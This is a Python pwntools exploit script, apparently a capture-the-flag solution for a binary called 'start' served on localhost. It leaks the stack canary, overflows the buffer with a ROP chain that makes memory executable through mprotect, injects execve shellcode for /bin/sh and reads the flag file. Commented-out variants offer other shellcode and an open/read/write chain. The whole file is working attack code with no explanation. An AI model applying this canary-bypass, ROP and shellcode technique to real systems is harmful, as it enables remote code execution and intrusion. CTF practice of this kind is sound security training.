from pwn import *

# p = process("./start")
p = remote("localhost", 31338)
context(arch="amd64")

if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
    gdb.attach(p, """set disassembly-flavor intel
        b puts
        """)

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
# shellcode = asm(shellcraft.echo("flag.txt"))
# shellcode = "6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80c0000002f62696e2f77686f616d690056574889e60f05".decode("hex")

p.sendline("A"*24)
print repr(p.recvline())
canary_leak =  p.recvline()[:-4]

canary_leak = '\x00' + canary_leak
print "Canary leak:", repr(canary_leak)
assert(len(canary_leak) == 8)

# SYSCALL NUMS
mprotect = 0xa
read = 0x0

buf = 0x6cb000

r = ROP("./start")
r.mprotect(buf, 0x100, 7) # args are addr, len, protection (rwx)
r.read(0, buf, 23) # fd, addr, len
ret = 0x4002f6
raw_r = str(r)[:-8] + p64(ret)

# r.call("open", ["./flag", "r"])
# r.call("read", [4 , 0x6cb000, 4])
# r.call("write", [2, 0x6cb000, 4])
# raw_r = str(r)


payload = 'A'*24
payload += canary_leak
payload += 'B'*8
# payload += p64(0x400aee)
# payload += 'CCCCCCCC'
payload += raw_r
payload += p64(buf)

p.sendline(payload)
print p.recvline()

p.sendline("exit")
p.sendline(shellcode)
# p.interactive()
p.sendline("/bin/cat flag")

print p.recvline()
print p.recvline()
print p.recvline()
print p.recvline()


